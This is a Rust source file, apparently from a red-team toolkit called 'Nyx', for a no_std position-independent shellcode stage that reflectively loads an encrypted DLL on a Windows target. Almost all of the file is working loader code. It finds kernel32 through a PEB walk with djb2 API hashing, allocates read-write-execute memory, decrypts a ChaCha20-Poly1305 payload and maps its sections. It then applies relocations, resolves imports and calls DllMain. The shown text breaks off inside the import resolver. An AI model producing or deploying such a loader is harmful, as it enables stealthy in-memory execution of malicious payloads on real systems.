//! Nyx LAYER2 reflective loader — Rust no_std PIC.
//!
//! This crate compiles to a raw position-independent binary that runs as bare
//! shellcode on the Windows engagement target. The `nyx_layer2_entry` function
//! below is the entry point invoked by the LAYER1 bootstrap after it has
//! self-located, scanned forward for the NYX2 magic, and parsed the header.
//!
//! # Register ABI on entry
//!
//! LAYER1 hands control to [`nyx_layer2_entry`] with the Win64 calling
//! convention (the entry is `extern "C"` so the first four args arrive in
//! `rcx`, `rdx`, `r8`, `r9`):
//!
//! | register | arg          | meaning                                          |
//! |----------|--------------|--------------------------------------------------|
//! | `rcx`    | `key`        | pointer to the 32-byte ChaCha20 key slot         |
//! | `rdx`    | `nonce`      | pointer to the 12-byte nonce (from NYX2 header)  |
//! | `r8`     | `ct`         | pointer to ciphertext \|\| 16-byte Poly1305 tag  |
//! | `r9`     | `ct_len`     | ciphertext length in bytes (excludes tag)        |
//!
//! (A fifth arg, the output pointer, would land on the stack at `[rsp+0x28]`.
//! We do NOT take it — LAYER2 allocates its own output page via the resolved
//! `VirtualAlloc`, so the harness only needs to know it succeeded via the
//! return value. The LAYER1 stub passes 4 args in registers; we keep the entry
//! signature to those 4.)
//!
//! # Returns
//!
//! * `0` on success — the reflective PE load completed and `DllMain` returned.
//! * `usize::MAX` on Poly1305 tag mismatch — output buffer is zeroed first.
//! * `1`/`2`/… — PEB-walk failure, alloc failure, or PE-parse failure.
//!
//! The host-side loader probe harness (`tools/loader_probe_dll`) interprets any
//! return as `OK rv=<N>` and relies on its Vectored Exception Handler for
//! crash detection, so a nonzero-but-finite return is still "OK" from the
//! harness POV — the value is the diagnostic.
//!
//! # What it does
//!
//! 1. **PEB walk** (`gs:[0x60]` → PEB → Ldr → InLoadOrderModuleList) — find
//!    `kernel32.dll` by djb2 hash of `BaseDllName`, then walk its export
//!    address table to resolve `VirtualAlloc`, `LoadLibraryA`,
//!    `GetProcAddress`.
//! 2. **Allocate** — `VirtualAlloc(NULL, ct_len, MEM_COMMIT|MEM_RESERVE,
//!    PAGE_EXECUTE_READWRITE)` for the decrypted image.
//! 3. **Decrypt** — ChaCha20-Poly1305 (RFC 8439) composed by hand from the
//!    `chacha20` + `poly1305` primitives (no `alloc`). On tag mismatch: zero
//!    the buffer and return `usize::MAX`.
//! 4. **Reflective load** — map sections, apply `IMAGE_REL_BASED_DIR64`
//!    relocations, resolve imports via `LoadLibraryA` + `GetProcAddress`,
//!    call `DllMain(base, DLL_PROCESS_ATTACH, NULL)`.
//!
//! # Panic strategy
//!
//! `panic = "abort"` (see `Cargo.toml`). A panic in no_std shellcode is a bug;
//! aborting is safer than letting it unwind into nothing.

#![no_std]
#![no_main]

// ── djb2 hash constants (must match nyx_loader::on_target) ─────────────────
//
// These are computed by the host-side `djb2` in `nyx_loader::peb_walk` and
// pinned by `on_target::tests::hash_constants_match_djb2_of_names`. We duplicate
// the values here (no shared module: the host crate is std, this crate is
// no_std) and the host-side test `tests/djb2_hashes.rs` cross-checks them.
const HASH_KERNEL32_DLL: u32 = 0x7040EE75;
const HASH_VIRTUAL_ALLOC: u32 = 0x58DACBD7;
const HASH_LOAD_LIBRARY_A: u32 = 0x0666395B;
const HASH_GET_PROC_ADDRESS: u32 = 0x82172F7F;

const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const DLL_PROCESS_ATTACH: u32 = 1;

// ── Win32 types ────────────────────────────────────────────────────────────

use core::ffi::c_void;

type VirtualAllocFn = unsafe extern "system" fn(
    addr: *const c_void,
    size: usize,
    alloc_type: u32,
    protect: u32,
) -> *mut c_void;
type LoadLibraryAFn = unsafe extern "system" fn(lib: *const u8) -> *mut c_void;
type GetProcAddressFn = unsafe extern "system" fn(
    module: *const c_void,
    name: *const u8,
) -> *mut c_void;
type DllMainFn = unsafe extern "system" fn(
    base: *const c_void,
    reason: u32,
    reserved: *const c_void,
) -> i32;

// ── Resolved bootstrap APIs ────────────────────────────────────────────────

#[derive(Clone, Copy)]
struct Bootstrap {
    virtual_alloc: VirtualAllocFn,
    load_library_a: LoadLibraryAFn,
    get_proc_address: GetProcAddressFn,
}

// ── PEB / LDR / export structures (x86-64, hand-rolled) ────────────────────
//
// Only the fields the walk touches are named; the rest are padding to preserve
// the documented x86-64 Windows layout. See `winternl.h` and the MalwareTech
// PEB-walk reference.

#[repr(C)]
#[derive(Clone, Copy)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *const u16,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct ListEntry {
    flink: *mut ListEntry,
    blink: *mut ListEntry,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct PebLdrData {
    _length: u32,
    _initialized: u32,
    _ss_handle: *mut c_void,
    // offset 0x10 — InLoadOrderModuleList head.
    in_load_order_module_list: ListEntry,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct Peb {
    _inherited_address_space: u8,
    _read_image_file_exec_options: u8,
    _being_debugged: u8,
    _bit_field: u8,
    _padding: [u8; 4],
    _mutant: *mut c_void,
    _image_base_address: *mut c_void,
    // offset 0x18 — PEB_LDR_DATA pointer.
    ldr: *mut PebLdrData,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct LdrEntry {
    // offset 0x00 — InLoadOrderLinks (first field ⇒ node ptr IS entry ptr).
    in_load_order_links: ListEntry,
    _in_memory_order_links: ListEntry,
    _in_initialization_order_links: ListEntry,
    // offset 0x30 — mapped base of the module.
    dll_base: *mut c_void,
    _entry_point: *mut c_void,
    _size_of_image: u32,
    _full_dll_name: UnicodeString,
    // BaseDllName — what we hash to find a module.
    base_dll_name: UnicodeString,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct ImageExportDirectory {
    _characteristics: u32,
    _time_date_stamp: u32,
    _major_version: u16,
    _minor_version: u16,
    _name: u32,
    base: u32,
    number_of_functions: u32,
    number_of_names: u32,
    address_of_functions: u32,
    address_of_names: u32,
    address_of_name_ordinals: u32,
}

// ── PEB-read intrinsic ─────────────────────────────────────────────────────
//
// `gs:[0x60]` on x86-64 Windows holds the PEB pointer. We use inline asm
// (core::arch::asm!) rather than an extern static because the GS-relative
// access has no symbol the linker can resolve.

/// Read the PEB pointer. Returns `null` if the GS segment base is unset (which
/// never happens in a Windows user-mode thread but is defensive).
#[cfg(target_arch = "x86_64")]
unsafe fn peb_pointer() -> *mut Peb {
    let peb: *mut Peb;
    unsafe {
        core::arch::asm!(
            "mov {p}, gs:[0x60]",
            p = out(reg) peb,
            options(nostack, preserves_flags, readonly),
        );
    }
    peb
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn peb_pointer() -> *mut Peb {
    core::ptr::null_mut()
}

// ── djb2 hash (case-insensitive) ───────────────────────────────────────────
//
// Identical to `nyx_loader::peb_walk::djb2` and `djb2_utf16_low`: seed 5381,
// multiply by 33, add the lower-cased byte. Wrapping arithmetic (u32).

fn djb2_ascii(name: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    for &b in name {
        h = h.wrapping_mul(33).wrapping_add(b.to_ascii_lowercase() as u32);
    }
    h
}

/// djb2 over a UTF-16LE buffer using only the low byte of each code unit
/// (sufficient for ASCII module names; matches `djb2_utf16_low`).
fn djb2_utf16_low(units: &[u16]) -> u32 {
    let mut h: u32 = 5381;
    for &u in units {
        let lo = (u & 0xFF) as u8;
        h = h.wrapping_mul(33).wrapping_add(lo.to_ascii_lowercase() as u32);
    }
    h
}

// ── PEB walk: resolve Bootstrap ────────────────────────────────────────────

/// Walk InLoadOrderModuleList looking for `kernel32.dll` (by hash of
/// `BaseDllName`), then walk its export table to resolve `VirtualAlloc`,
/// `LoadLibraryA`, `GetProcAddress`. Returns `None` on any failure.
///
/// # Safety
/// Must run in a Windows user-mode thread (GS segment → TEB).
unsafe fn resolve_bootstrap() -> Option<Bootstrap> {
    // SAFETY: caller guarantees Windows user-mode context.
    let peb = unsafe { peb_pointer() };
    if peb.is_null() {
        return None;
    }
    let ldr = unsafe { (*peb).ldr };
    if ldr.is_null() {
        return None;
    }
    // The list head is a node whose flink points at the first entry; walk until
    // we come back to the head (sentinel). Guard cap against a corrupted list.
    let list_head: *const ListEntry = unsafe { core::ptr::addr_of!((*ldr).in_load_order_module_list) };
    let mut node = unsafe { (*ldr).in_load_order_module_list.flink };
    let mut guard = 0u32;
    while !core::ptr::eq(node, list_head) && guard < 1024 {
        guard += 1;
        if node.is_null() {
            break;
        }
        // InLoadOrderLinks is the first field ⇒ node IS the entry pointer.
        let entry = node as *mut LdrEntry;
        let base_dll = unsafe { (*entry).base_dll_name };
        let nb = base_dll.buffer;
        let nbytes = base_dll.length as usize;
        if !nb.is_null() && nbytes >= 2 {
            let nchars = nbytes / 2;
            // SAFETY: nb is a valid wide buffer of nchars code units.
            let chars = unsafe { core::slice::from_raw_parts(nb, nchars) };
            if djb2_utf16_low(chars) == HASH_KERNEL32_DLL {
                let dll_base = unsafe { (*entry).dll_base } as *mut u8;
                if !dll_base.is_null() {
                    let va_ptr = unsafe { export_by_hash(dll_base, HASH_VIRTUAL_ALLOC) };
                    let lla_ptr = unsafe { export_by_hash(dll_base, HASH_LOAD_LIBRARY_A) };
                    let gpa_ptr = unsafe { export_by_hash(dll_base, HASH_GET_PROC_ADDRESS) };
                    // Reject null resolutions defensively — calling a null fn
                    // pointer would crash.
                    if va_ptr.is_null() || lla_ptr.is_null() || gpa_ptr.is_null() {
                        return None;
                    }
                    // SAFETY: raw pointer → extern "system" fn via transmute
                    // (a direct `as` cast is rejected by the compiler).
                    let va: VirtualAllocFn = unsafe { core::mem::transmute(va_ptr) };
                    let lla: LoadLibraryAFn = unsafe { core::mem::transmute(lla_ptr) };
                    let gpa: GetProcAddressFn = unsafe { core::mem::transmute(gpa_ptr) };
                    return Some(Bootstrap {
                        virtual_alloc: va,
                        load_library_a: lla,
                        get_proc_address: gpa,
                    });
                }
            }
        }
        // SAFETY: entry is a valid LdrEntry; flink is the next node.
        node = unsafe { (*entry).in_load_order_links.flink };
    }
    None
}

/// Parse a module base pointer's export directory and resolve a function by
/// the djb2 hash of its export name. Returns the absolute VA, or null if not
/// found (incl. forwarded exports — we do not recurse).
///
/// # Safety
/// `base` must point at a mapped, readable PE image with valid headers.
unsafe fn export_by_hash(base: *mut u8, hash: u32) -> *mut c_void {
    // DOS header → e_lfanew → NT headers → optional header → data dir[0].
    if base.is_null() {
        return core::ptr::null_mut();
    }
    // SAFETY: caller guarantees valid readable PE headers.
    let e_lfanew = unsafe { core::ptr::read(base.add(0x3C) as *const i32) };
    if e_lfanew < 0 || (e_lfanew as usize) >= 0x1000 {
        return core::ptr::null_mut();
    }
    let nt = unsafe { base.add(e_lfanew as usize) };
    // "PE\0\0" check.
    let sig = unsafe { core::ptr::read(nt as *const u32) };
    if sig != 0x0000_4550 {
        // "PE\0\0" little-endian
        return core::ptr::null_mut();
    }
    // File header (20 bytes) follows the 4-byte sig; optional header after.
    let opt = unsafe { nt.add(24) };
    let magic = unsafe { core::ptr::read(opt as *const u16) };
    // Export directory is data directory index 0. Its offset inside the
    // optional header depends on PE32 (96) vs PE32+ (112).
    let data_dir_off = if magic == 0x020B { 112 } else { 96 };
    let export_rva = unsafe { core::ptr::read(opt.add(data_dir_off) as *const u32) };
    let export_size = unsafe { core::ptr::read(opt.add(data_dir_off + 4) as *const u32) };
    if export_rva == 0 || export_size == 0 {
        return core::ptr::null_mut();
    }
    let dir = unsafe { base.add(export_rva as usize) as *const ImageExportDirectory };
    // SAFETY: export directory is readable for export_size bytes.
    let n = unsafe { (*dir).number_of_names as usize };
    if n == 0 || n > 0x10000 {
        return core::ptr::null_mut();
    }
    let names = unsafe { base.add((*dir).address_of_names as usize) as *const u32 };
    let ordinals =
        unsafe { base.add((*dir).address_of_name_ordinals as usize) as *const u16 };
    let funcs =
        unsafe { base.add((*dir).address_of_functions as usize) as *const u32 };
    for i in 0..n {
        // SAFETY: i < n ⇒ within the names table.
        let name_rva = unsafe { core::ptr::read(names.add(i)) };
        if name_rva == 0 {
            continue;
        }
        let name_ptr = unsafe { base.add(name_rva as usize) };
        // Hash the C string up to NUL.
        let mut h: u32 = 5381;
        let mut p = name_ptr;
        loop {
            // SAFETY: export names are NUL-terminated within the export dir.
            let c = unsafe { core::ptr::read(p) };
            if c == 0 {
                break;
            }
            h = h.wrapping_mul(33).wrapping_add(c.to_ascii_lowercase() as u32);
            p = unsafe { p.add(1) };
        }
        if h == hash {
            // SAFETY: i < n ⇒ ordinal table readable.
            let ord = unsafe { core::ptr::read(ordinals.add(i)) } as usize;
            // SAFETY: ord is bounded by number_of_functions per the PE spec.
            let func_rva = unsafe { core::ptr::read(funcs.add(ord)) } as usize;
            // Forwarded-export detection: if func_rva falls inside the export
            // directory, it is an ASCII forwarder string, not a code pointer.
            let dir_start = export_rva as usize;
            let dir_end = dir_start + export_size as usize;
            if func_rva >= dir_start && func_rva < dir_end {
                return core::ptr::null_mut();
            }
            return unsafe { base.add(func_rva) } as *mut c_void;
        }
    }
    core::ptr::null_mut()
}

// ── ChaCha20-Poly1305 decrypt (RFC 8439, no alloc) ─────────────────────────
//
// Composed from the raw `chacha20` and `poly1305` primitives. We:
//   1. Derive the Poly1305 one-time key = ChaCha20(key, nonce, counter=0)
//      block 0 (32 bytes).
//   2. Build the Poly1305 MAC input = aad (none) || ciphertext padded to 16
//      || 8-byte LE aad_len (0) || 8-byte LE ciphertext_len.
//   3. Constant-time compare the computed tag against the last 16 bytes of
//      `ct || tag`. On mismatch zero `out` and return false.
//   4. Stream-cipher-decrypt ciphertext (counter starts at 1, since block 0
//      was spent on the Poly key) directly into `out`.
//
// This avoids the `aead::Aead` trait's `Vec`-returning API so no allocator is
// required.

use chacha20::ChaCha20;
use chacha20::cipher::{KeyInit, KeyIvInit, StreamCipher};
use poly1305::universal_hash::UniversalHash;
use poly1305::Poly1305;

/// Poly1305 block size.
const POLY1305_BLOCK: usize = 16;
/// Poly1305 tag size.
const TAG_LEN: usize = 16;
/// ChaCha20 block size.
const CHACHA_BLOCK: usize = 64;

/// Constant-time equality for 16-byte tags.
fn ct_eq_16(a: &[u8], b: &[u8]) -> bool {
    debug_assert!(a.len() == 16 && b.len() == 16);
    let mut diff: u8 = 0;
    for i in 0..16 {
        diff |= a[i] ^ b[i];
    }
    diff == 0
}

/// Decrypt `ct_len` bytes of ciphertext + 16-byte tag from `ct` into `out`
/// using ChaCha20-Poly1305 with `key` (32B) and `nonce` (12B). `out` must be at
/// least `ct_len` bytes. Returns `true` on tag match, `false` (and zeroes
/// `out[..ct_len]`) on mismatch.
///
/// # Safety
/// `ct` must be readable for `ct_len + TAG_LEN` bytes; `out` must be writable
/// for `ct_len` bytes; `key` for 32 bytes; `nonce` for 12 bytes.
unsafe fn chacha20poly1305_decrypt(
    key: *const u8,
    nonce: *const u8,
    ct: *const u8,
    ct_len: usize,
    out: *mut u8,
) -> bool {
    let key_sl = unsafe { core::slice::from_raw_parts(key, 32) };
    let nonce_sl = unsafe { core::slice::from_raw_parts(nonce, 12) };
    let ct_sl = unsafe { core::slice::from_raw_parts(ct, ct_len + TAG_LEN) };
    let out_sl = unsafe { core::slice::from_raw_parts_mut(out, ct_len) };

    // ── 1. Derive the Poly1305 one-time key (ChaCha20 block 0). ───────────
    // Per RFC 8439 §2.6: poly_key = ChaCha20(key, nonce, counter=0)[0..32].
    // The remaining 32 bytes of block 0 are discarded, and the payload
    // keystream begins at counter 1.
    let mut poly_key_block = [0u8; CHACHA_BLOCK];
    let mut chacha = ChaCha20::new(key_sl.into(), nonce_sl.into());
    chacha.apply_keystream(&mut poly_key_block);
    // chacha20 cipher is now positioned at counter 1 (block 0 fully consumed).

    // ── 2. Compute the Poly1305 tag over the constructed MAC input. ───────
    //   mac_input = pad16(aad) || pad16(ciphertext) || u64le(aad_len) || u64le(ct_len)
    // aad is empty here, so pad16(aad) is empty.
    let mut poly = Poly1305::new_from_slice(&poly_key_block[..32])
        .expect("poly1305 key is always 32 bytes");
    // update_padded handles pad16 internally for variable-length input.
    poly.update_padded(&ct_sl[..ct_len]);
    // Lengths block: two u64 little-endian values = one 16-byte Poly1305 block.
    // update_padded on an exactly-16-byte input adds no padding.
    let mut lengths = [0u8; 16];
    lengths[..8].copy_from_slice(&(0u64).to_le_bytes()); // aad_len = 0
    lengths[8..].copy_from_slice(&(ct_len as u64).to_le_bytes());
    poly.update_padded(&lengths);
    let computed_block = poly.finalize();
    let computed: &[u8] = computed_block.as_slice();

    // ── 3. Constant-time compare against the trailing 16 bytes of ct. ─────
    let provided = &ct_sl[ct_len..ct_len + TAG_LEN];
    let ok = ct_eq_16(computed, provided);
    if !ok {
        // Zero the output buffer (spec: silent bail, no crash, no log).
        for b in out_sl.iter_mut() {
            *b = 0;
        }
        return false;
    }

    // ── 4. Decrypt the ciphertext into `out`. ─────────────────────────────
    // The keystream is already positioned at counter 1 (block 1). XOR it into
    // `out` directly from the ciphertext.
    out_sl.copy_from_slice(&ct_sl[..ct_len]);
    chacha.apply_keystream(out_sl);
    true
}

// ── Reflective PE load ─────────────────────────────────────────────────────
//
// Adapted from `nyx_loader::stub::reflective_load_at` (the host-side reference
// implementation). Runs entirely against the in-memory decrypted image: parses
// PE headers, copies sections to their virtual offsets, applies
// IMAGE_REL_BASED_DIR64 relocations, resolves imports via the resolved
// `LoadLibraryA` + `GetProcAddress`, then calls DllMain.

const IMAGE_REL_BASED_ABSOLUTE: u16 = 0;
const IMAGE_REL_BASED_DIR64: u16 = 10;

#[repr(C)]
#[derive(Clone, Copy)]
struct ImageDosHeader {
    e_magic: u16,
    _pad: [u8; 58],
    e_lfanew: i32,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct ImageFileHeader {
    _machine: u16,
    number_of_sections: u16,
    _time_date_stamp: u32,
    _pointer_to_symbol_table: u32,
    _number_of_symbols: u32,
    size_of_optional_header: u16,
    _characteristics: u16,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct ImageOptionalHeaderPe32Plus {
    // Standard fields (24 bytes).
    magic: u16,
    _major_linker: u8,
    _minor_linker: u8,
    _size_of_code: u32,
    _size_of_init_data: u32,
    _size_of_uninit_data: u32,
    address_of_entry_point: u32,
    _base_of_code: u32,
    // Windows-specific (88 bytes).
    image_base: u64,
    _section_alignment: u32,
    _file_alignment: u32,
    _os_ver: u16,
    _img_ver: u16,
    _sub_ver: u16,
    _win32_ver: u32,
    size_of_image: u32,
    size_of_headers: u32,
    // … the rest is not needed for the load.
}

#[repr(C)]
#[derive(Clone, Copy)]
struct ImageSectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    _pointer_to_relocations: u32,
    _pointer_to_line_numbers: u32,
    _number_of_relocations: u16,
    _number_of_line_numbers: u16,
    characteristics: u32,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct ImageImportDescriptor {
    original_first_thunk: u32,
    _time_date_stamp: u32,
    _forwarder_chain: u32,
    name: u32,
    first_thunk: u32,
}

#[repr(C)]
#[derive(Clone, Copy)]
struct ImageBaseRelocation {
    virtual_address: u32,
    size_of_block: u32,
}

/// Read a `&[u8]` slice from a mapped image at `(rva, len)`, bounds-checked
/// against `image_size`. Returns `None` on overflow.
fn pe_slice<'a>(image: &'a [u8], rva: u32, len: usize) -> Option<&'a [u8]> {
    let rva = rva as usize;
    if rva.checked_add(len)? > image.len() {
        return None;
    }
    Some(&image[rva..rva + len])
}

/// Reflectively map + fix up + invoke the entry point. `image` is the decrypted
/// PE bytes (as returned by [`chacha20poly1305_decrypt`]).
///
/// # Safety
/// `image` must be a valid PE32+ buffer of `image.len()` bytes. The `Bootstrap`
/// function pointers must be live kernel32 exports.
unsafe fn reflective_load(image: &[u8], boot: &Bootstrap) -> bool {
    if image.len() < 0x40 + 4 + 20 + 24 {
        return false;
    }
    // DOS header.
    let dos = unsafe { &*(image.as_ptr() as *const ImageDosHeader) };
    if dos.e_magic != 0x5A4D {
        // "MZ"
        return false;
    }
    let e_lfanew = dos.e_lfanew;
    if e_lfanew < 0 || (e_lfanew as usize) + 4 + 20 + 24 > image.len() {
        return false;
    }
    let nt_off = e_lfanew as usize;
    // "PE\0\0".
    let sig = u32::from_le_bytes([
        image[nt_off],
        image[nt_off + 1],
        image[nt_off + 2],
        image[nt_off + 3],
    ]);
    if sig != 0x0000_4550 {
        return false;
    }
    let file_hdr_off = nt_off + 4;
    let file = unsafe {
        &*(image.as_ptr().add(file_hdr_off) as *const ImageFileHeader)
    };
    let opt_off = file_hdr_off + 20;
    if file.size_of_optional_header < 240 {
        return false;
    }
    let opt = unsafe { &*(image.as_ptr().add(opt_off) as *const ImageOptionalHeaderPe32Plus) };
    // PE32+ only.
    if opt.magic != 0x020B {
        return false;
    }
    let image_base_preferred = opt.image_base;
    let size_of_image = opt.size_of_image as usize;
    if size_of_image == 0 || size_of_image > image.len() {
        // We map into VirtualAlloc'd memory of `image.len()` (= ct_len, the
        // decrypted PE size on disk). A mapped SizeOfImage larger than that
        // cannot fit; reject.
        return false;
    }
    let entry_rva = opt.address_of_entry_point as usize;
    let size_of_headers = opt.size_of_headers as usize;

    // ── 1. Allocate the image base via VirtualAlloc (RWX). ────────────────
    // SAFETY: boot.virtual_alloc is a live kernel32 export.
    let base = unsafe {
        (boot.virtual_alloc)(
            core::ptr::null(),
            size_of_image,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };
    if base.is_null() {
        return false;
    }
    let base_u8 = base as *mut u8;
    // SAFETY: base is a freshly-allocated, zeroed (VirtualAlloc zeroes committed
    // memory) writable region of size_of_image bytes.
    let mapped = unsafe { core::slice::from_raw_parts_mut(base_u8, size_of_image) };

    // ── 2. Copy headers. ──────────────────────────────────────────────────
    let hdr_len = size_of_headers.min(image.len()).min(size_of_image);
    mapped[..hdr_len].copy_from_slice(&image[..hdr_len]);

    // ── 3. Copy sections to their VirtualAddress. ─────────────────────────
    let sect_off = opt_off + file.size_of_optional_header as usize;
    let n_sect = file.number_of_sections as usize;
    if nsect_check(n_sect, sect_off, image.len()).is_none() {
        return false;
    }
    for i in 0..n_sect {
        let s_off = sect_off + i * 40;
        let sec = unsafe {
            &*(image.as_ptr().add(s_off) as *const ImageSectionHeader)
        };
        let va = sec.virtual_address as usize;
        let vsize = sec.virtual_size as usize;
        let raw_off = sec.pointer_to_raw_data as usize;
        let raw_size = sec.size_of_raw_data as usize;
        if vsize == 0 || va >= size_of_image {
            continue;
        }
        let dst_end = (va + vsize).min(size_of_image);
        let dst_len = dst_end - va;
        if raw_size == 0 || raw_off == 0 || raw_off >= image.len() {
            // BSS-style: mapped region is already zeroed.
            continue;
        }
        let src_end = match raw_off.checked_add(raw_size) {
            Some(e) => e,
            None => continue,
        };
        if src_end > image.len() {
            continue;
        }
        let copy_len = dst_len.min(raw_size);
        mapped[va..va + copy_len]
            .copy_from_slice(&image[raw_off..raw_off + copy_len]);
    }

    // ── 4. Apply DIR64 base relocations (delta = base - preferred). ───────
    let delta = (base as u64).wrapping_sub(image_base_preferred);
    if delta != 0 {
        // Export reloc dir = data dir[5] in the optional header. Its offset in
        // the PE32+ optional header: 112 (data dir start) + 5*8 = 152.
        let reloc_dir_rva = u32::from_le_bytes([
            image[opt_off + 112 + 5 * 8],
            image[opt_off + 112 + 5 * 8 + 1],
            image[opt_off + 112 + 5 * 8 + 2],
            image[opt_off + 112 + 5 * 8 + 3],
        ]);
        let reloc_dir_size = u32::from_le_bytes([
            image[opt_off + 112 + 5 * 8 + 4],
            image[opt_off + 112 + 5 * 8 + 5],
            image[opt_off + 112 + 5 * 8 + 6],
            image[opt_off + 112 + 5 * 8 + 7],
        ]);
        if reloc_dir_rva != 0 && reloc_dir_size != 0 {
            if !apply_relocs(mapped, reloc_dir_rva as usize, reloc_dir_size as usize, delta) {
                return false;
            }
        }
    }

    // ── 5. Resolve imports → patch the IAT in mapped memory. ──────────────
    // Import dir = data dir[1]. Offset in optional header: 112 + 1*8 = 120.
    let imp_dir_rva = u32::from_le_bytes([
        image[opt_off + 112 + 1 * 8],
        image[opt_off + 112 + 1 * 8 + 1],
        image[opt_off + 112 + 1 * 8 + 2],
        image[opt_off + 112 + 1 * 8 + 3],
    ]);
    let imp_dir_size = u32::from_le_bytes([
        image[opt_off + 112 + 1 * 8 + 4],
        image[opt_off + 112 + 1 * 8 + 5],
        image[opt_off + 112 + 1 * 8 + 6],
        image[opt_off + 112 + 1 * 8 + 7],
    ]);
    if imp_dir_rva != 0 && imp_dir_size != 0 {
        if !resolve_imports(mapped, imp_dir_rva as usize, imp_dir_size as usize, boot) {
            return false;
        }
    }

    // ── 6. Call DllMain(base, DLL_PROCESS_ATTACH, NULL). ──────────────────
    let entry_va = base_u8.add(entry_rva);
    // Cast the raw code pointer to the DllMain fn type via transmute (a direct
    // `as` cast pointer→fn is rejected by the compiler).
    // SAFETY: entry_va is a valid code address (the PE entry point); transmuting
    // a pointer to an `extern "system" fn` with a matching ABI is sound.
    let dll_main: DllMainFn = unsafe { core::mem::transmute(entry_va) };
    // SAFETY: entry_va is the resolved DllMain per the PE entry point; calling
    // it with DLL_PROCESS_ATTACH is the standard reflective-load terminator.
    let _ = unsafe { dll_main(base as *const c_void, DLL_PROCESS_ATTACH, core::ptr::null()) };
    true
}

/// Defensive bounds check that the section table fits in the image.
fn nsect_check(n_sect: usize, sect_off: usize, image_len: usize) -> Option<()> {
    if n_sect > 96 {
        return None;
    }
    sect_off.checked_add(n_sect * 40)?; // ensure no overflow
    if sect_off + n_sect * 40 > image_len {
        return None;
    }
    Some(())
}

/// Apply `IMAGE_REL_BASED_DIR64` relocations from the `.reloc` table to the
/// mapped image.
fn apply_relocs(mapped: &mut [u8], rva: usize, size: usize, delta: u64) -> bool {
    if rva + size > mapped.len() {
        return false;
    }
    let mut pos = rva;
    let end = rva + size;
    while pos + 8 <= end {
        let block = match ImageBaseRelocation::read_at(mapped, pos) {
            Some(b) => b,
            None => return false,
        };
        let block_size = block.size_of_block as usize;
        if block_size < 8 || pos + block_size > end {
            return false;
        }
        let page_rva = block.virtual_address as usize;
        let entries = (block_size - 8) / 2;
        for i in 0..entries {
            let entry = u16::from_le_bytes([mapped[pos + 8 + i * 2], mapped[pos + 8 + i * 2 + 1]]);
            let typ = entry >> 12;
            let offset = (entry & 0x0FFF) as usize;
            if typ == IMAGE_REL_BASED_ABSOLUTE {
                continue; // padding
            }
            if typ != IMAGE_REL_BASED_DIR64 {
                continue; // skip rare others (only DIR64 in PE32+)
            }
            let target = match page_rva.checked_add(offset) {
                Some(t) => t,
                None => return false,
            };
            if target + 8 > mapped.len() {
                return false;
            }
            let arr: [u8; 8] = match mapped[target..target + 8].try_into() {
                Ok(a) => a,
                Err(_) => return false,
            };
            let current = u64::from_le_bytes(arr);
            let fixed = current.wrapping_add(delta);
            mapped[target..target + 8].copy_from_slice(&fixed.to_le_bytes());
        }
        pos += block_size;
    }
    true
}

impl ImageBaseRelocation {
    fn read_at(image: &[u8], pos: usize) -> Option<Self> {
        if pos + 8 > image.len() {
            return None;
        }
        Some(ImageBaseRelocation {
            virtual_address: u32::from_le_bytes([
                image[pos],
                image[pos + 1],
                image[pos + 2],
                image[pos + 3],
            ]),
            size_of_block: u32::from_le_bytes([
                image[pos + 4],
                image[pos + 5],
                image[pos + 6],
                image[pos + 7],
            ]),
        })
    }
}

/// Resolve the import table: for each descriptor, LoadLibraryA the named DLL
/// and GetProcAddress each thunk, writing the result into the IAT (mapped in
/// place at the FirstThunk RVAs).
fn resolve_imports(
    mapped: &mut [u8],
    rva: usize,
    _size: usize,
    boot: &Bootstrap,
) -> bool {
    // Each descriptor is 20 bytes; the table is terminated by an all-zero one.
    let mut pos = rva;
    while pos + 20 <= mapped.len() {
        let desc = ImageImportDescriptor {
            original_first_thunk: u32::from_le_bytes([
                mapped[pos],
                mapped[pos + 1],
                mapped[pos + 2],
                mapped[pos + 3],
            ]),
            _time_date_stamp: 0,
            _forwarder_chain: 0,
            name: u32::from_le_bytes([
                mapped[pos + 12],
                mapped[pos + 13],
                mapped[pos + 14],
                mapped[pos + 15],
            ]),
            first_thunk: u32::from_le_bytes([
                mapped[pos + 16],
                mapped[pos + 17],
                mapped[pos + 18],
                mapped[pos + 19],
            ]),
        };
        if desc.name == 0 && desc.first_thunk == 0 {
            break; // null terminator
        }
        // Read the DLL name (C string).
        let name_rva = desc.name as usize;
        if name_rva >= mapped.len() {
            return false;
        }
        let mut name_end = name_rva;
        while name_end < mapped.len() && mapped[name_end] != 0 {
            name_end += 1;
        }
        let dll_name = &mapped[name_rva..name_end];
        // SAFETY: boot.load_library_a is the live kernel32 export; dll_name is
        // a temporary slice but the call copies it into a stack buffer to give
        // LoadLibraryA a stable NUL-terminated pointer.
        let module = unsafe { load_lib_nul(boot.load_library_a, dll_name) };
        if module.is_null() {
            return false;
        }
        // Walk the IAT (FirstThunk) and (if present) the ILT
        // (OriginalFirstThunk) for the hint/name. If OFT is 0 (bound import),
        // FirstThunk itself holds the pre-bind RVAs.
        let iat_rva = desc.first_thunk as usize;
        let ilt_rva = desc.original_first_thunk as usize;
        let mut idx = 0usize;
        loop {
            let iat_slot = match iat_rva.checked_add(idx * 8) {
                Some(s) => s,
                None => return false,
            };
            if iat_slot + 8 > mapped.len() {
                return false;
            }
            let iat_val = u64::from_le_bytes([
                mapped[iat_slot],
                mapped[iat_slot + 1],
                mapped[iat_slot + 2],
                mapped[iat_slot + 3],
                mapped[iat_slot + 4],
                mapped[iat_slot + 5],
                mapped[iat_slot + 6],
                mapped[iat_slot + 7],
            ]);
            if iat_val == 0 {
                break; // end of thunk list
            }
